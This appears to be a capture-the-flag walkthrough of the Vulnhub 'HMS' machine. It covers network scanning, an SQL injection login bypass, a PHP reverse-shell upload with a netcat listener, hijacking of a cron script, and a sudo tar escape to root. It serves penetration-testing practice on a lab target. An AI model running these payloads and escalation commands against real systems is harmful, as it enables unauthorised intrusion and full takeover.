# HMS-Writeup 
HMS is an easy machine from Vulnhub by Nivek. I have tested this machine on VirtualBox.

Link to the machine: [https://www.vulnhub.com/entry/hms-1,728/](https://www.vulnhub.com/entry/hms-1,728/)

## Identify the target
I am using the machine in host only network. Here, I am using netdiscover to detect the IP address of the target.
```
netdiscover -i vboxnet0 -r 10.10.10.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                                      
                                                                                                    
2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                                    
_____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
 10.10.10.1      08:00:27:fc:33:6c      1      42  PCS Systemtechnik GmbH                           
 10.10.10.10     08:00:27:56:f8:fd      1      60  PCS Systemtechnik GmbH
```
## Scan Open Ports
we have to look for the open ports on the target.
```
nmap -sV -sC -p- -oN nmap.log 10.10.10.10

21/tcp   open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.10.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:fc:ed:dc:9b:b3:24:ff:2e:c3:51:f8:33:20:78:40 (RSA)
|   256 91:5e:81:68:73:68:65:ec:a2:de:27:19:c6:82:86:a9 (ECDSA)
|_  256 a7:eb:f6:a2:c6:63:54:e1:f5:18:53:fc:c3:e1:b2:28 (ED25519)
7080/tcp open  http    Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/7.3.29 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/7.3.29 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Admin Panel
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```
We can access the FTP service anonymously.
```
ftp 10.10.10.10

Connected to 10.10.10.10.
220 (vsFTPd 3.0.3)
Name (10.10.10.10:a7): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        118          4096 Jul 26 19:27 .
drwxr-xr-x    2 0        118          4096 Jul 26 19:27 ..
226 Directory send OK.
ftp>
```
there aren’t any files in there.

## Examine Port 7080 - Apache

![](pics/login.png)

We have login page, so there is no register link from here and we don’t have credentials.

I’ll use Burp to intercept the request.

send it to repeter, modified email with `'`.

![](pics/burp1.png)

The field email in this form suffers from an SQL injection. 
```
' or 1=1 #
' or 1=1 -- 
```
You can also use developers tools to modify the request.

However, there is a validation in the input field that it must be an `email`. Thus we have to remove it to inject our payload. So, inspect the email field
and remove `type="email"`.

And we have access to the admin panel.

![](pics/admin1.png)

After we log into the dashboard, we see a directory for uploaded images in the source.

![](pics/source1.png)

And a path for the settings that is commented.

![](pics/source2.png)

When we visit `setting.php`, we see an image uploading feature.

![](pics/admin2.png)

## Reverse Shell
Lets upload a shell. There is a webshells in kali by default: `ls /usr/share/webshells/`

Or you can find one online: [revshells](https://www.revshells.com/),  [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

I Changed the ip address and port, and started listening on the same port.
```
nc -lnvp 5555
```
We have a dummy shell, lets upgrade it.

![](pics/shell1.png)

There are two users on the machine "eren" and "nivek". We need to switch to real user so lets check the SUID binaries.

![](pics/perm.png)

Reference: [https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid)

So we can use it to get an instance of bash shell as user `eren`.
```
/usr/bin/bash -p
```
We still user `daemon` but `eren` is the effective user for this process only, this means that we don't have access to sudo permissions.

![](pics/euid.png)

After an hour digging around, i checked the cron jobs, and there is a backup script in the eren's directory. 

![](pics/cron.png)

This script runs every 5 minutes, and owned by `eren`. we can modify it to get another reverse shell as user `eren` on port `1234`.

![](pics/nano.png)

In five minutes i got a shell with user eren.

![](pics/rshell1.png)

## Privilege Escalation

Lets check the sudo permission:
```
sudo -l

Matching Defaults entries for eren on nivek:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eren may run the following commands on nivek:
    (root) NOPASSWD: /bin/tar
```
Searching in gtfobins: [https://gtfobins.github.io/gtfobins/tar/#sudo](https://gtfobins.github.io/gtfobins/tar/#sudo)

tar gives us a root shell
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```
and we'r root.

![](pics/sudo.png)
